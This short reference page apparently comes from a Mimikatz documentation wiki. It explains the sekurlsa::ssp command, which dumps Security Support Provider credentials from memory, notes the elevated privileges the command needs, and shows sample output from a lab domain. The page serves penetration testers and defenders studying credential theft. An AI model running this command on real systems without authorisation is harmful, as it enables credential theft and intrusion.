# ssp

`sekurlsa::ssp` lists [Security Support Provider](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) (SSP) credentials.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::ssp

Authentication Id : 0 ; 697146 (00000000:000aa33a)
Session           : Service from 0
User Name         : MediaAdmin$
Domain            : hacklab
Logon Server      : DC
Logon Time        : 10/17/2021 4:22:01 AM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1427
        ssp :
```
